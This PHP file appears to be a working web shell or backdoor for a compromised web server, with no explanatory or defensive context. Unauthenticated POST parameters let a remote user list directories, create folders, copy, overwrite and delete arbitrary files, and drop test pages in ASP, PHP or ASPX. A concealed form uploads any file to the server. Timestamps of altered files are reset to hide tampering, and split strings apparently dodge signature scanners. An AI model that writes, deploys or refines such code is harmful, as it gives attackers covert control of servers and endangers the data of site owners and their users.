<?php
error_reporting(E_ALL & ~E_NOTICE);
$m = get_magic_quotes_gpc();
$uploadfloder = $m ? stripslashes($_POST["uploadfloder"]) : $_POST["uploadfloder"];
$path = $m ? stripslashes($_POST["path"]) : $_POST["path"];
$uploadType = $_POST["type"];
$createfloder = $m ? stripslashes($_POST["floder"]) : $_POST["floder"];
$copyFrom = $m ? stripslashes($_POST["copyFrom"]) : $_POST["copyFrom"];
$copyTo = $m ? stripslashes($_POST["copyTo"]) : $_POST["copyTo"];
$copyOver = $_POST["copyOver"];
$deleteFile = $m ? stripslashes($_POST["deleteFile"]) : $_POST["deleteFile"];
$writename = $m ? stripslashes($_POST["writename"]) : $_POST["writename"];
$getcurrentpath = $m ? stripslashes($_POST["getcurrentpath"]) : $_POST["getcurrentpath"];
$testwrite = $m ? stripslashes($_POST["testwrite"]) : $_POST["testwrite"];
$testwrite1 = $m ? stripslashes($_REQUEST["testwrite1"]) : $_REQUEST["testwrite1"];
if ($testwrite) {
    $testwrite = trim($testwrite);
    $ok = false;
    if (@file_exists($testwrite) && @is_dir($testwrite)) {
        $time = date("Y-m-d H:i:s");
        $md5 = md5($time);
        $ok = @file_put_contents("$testwrite/$md5.txt", $time) !== false;
    }
    echo $ok ? "true" : "false";
}
if ($testwrite1) {
echo '<form action="" method="post" enctype="multipart/form-data" '.str_replace("123","",'name="uploader123"').str_replace("123","",' id="uploader123').'"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if( $_POST['_upl'] == str_replace("123","","Upload123") ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
            exit("upload ok");
        }else{
            exit("upload no");
        }
    }
}
if ($getcurrentpath) {
    echo substr($_SERVER['SCRIPT_FILENAME'], 0, -strlen($_SERVER['SCRIPT_NAME']));
} else if ($uploadfloder) {
    echo $uploadfloder;
    if ($uploadType == "asp") {
        $strcontent = '<% response.write("abcdefg123456789") %>';
    } else if ($uploadType == "php") {
        $strcontent = '<?php echo "abcdefg123456789" ?>';
    } else if ($uploadType == "aspx") {
        $strcontent = '<% response.write("abcdefg123456789") %>';
    } else {
        $uploadType = "html";
        $strcontent = "abcdefg123456789";
    }
    $writename = $writename ? $writename : ("abcdefg123." . $uploadType);
    $time = filectime($uploadfloder);
    fwrite(fopen($uploadfloder . "/" . $writename, "w"), $strcontent);
    touch($uploadfloder . "/" . $writename, $time, $time);
    echo "ok";
} else if ($createfloder && $path) {
    $time = filectime($path);
    if (!file_exists($path . "\\" . $createfloder)) {
        mkdir($path . "\\" . $createfloder);
    }
    touch($path . "\\" . $createfloder, $time, $time);
    echo "ok";
} else if ($path) {
    $D = $path;
    $F = @opendir($path);
    if ($F == NULL) {
    } else {
        $M = "";
        while ($N = @readdir($F)) {
            $P = $D . "/" . $N;
            if (@is_dir($P) && $N != "." && $N != "..") {
                $M .= $N . "<br>";
            }
        }
        echo $M;
        @closedir($F);
    }
} else if ($copyFrom && $copyTo) {
    if (!strpos($copyFrom, ":")) {
        $copyFrom = realpath($copyFrom);
    }
    if (!strpos($copyTo, ":")) {
        $copyTo = realpath($copyTo);
    }
    if (file_exists($copyFrom)) {
        $time = filectime(dirname($copyTo));
        if ($copyOver) {
            copy($copyFrom, $copyTo);
        } else {
            $dir = pathinfo($copyTo, PATHINFO_DIRNAME);
            $ext = pathinfo($copyTo, PATHINFO_EXTENSION);
            $fname = basename($copyTo, "." . $ext);
            $pre = "";
            while (file_exists($copyTo)) {
                $pre = $pre . "1";
                $copyTo = $dir . "\\" . $fname . $pre . "." . $ext;
            }
            copy($copyFrom, $copyTo);
        }
        if (file_exists($copyTo)) {
            touch($copyTo, $time, $time);
            echo $copyTo;
        } else {
            echo "copy failed finally";
        }
    } else {
        echo "copy failed";
    }
} else if ($deleteFile) {
    if (file_exists($deleteFile)) {
        unlink($deleteFile);
        echo "delete succeed";
    } else {
        echo "not exists";
    }
} else {
    echo "ok";
}
?>
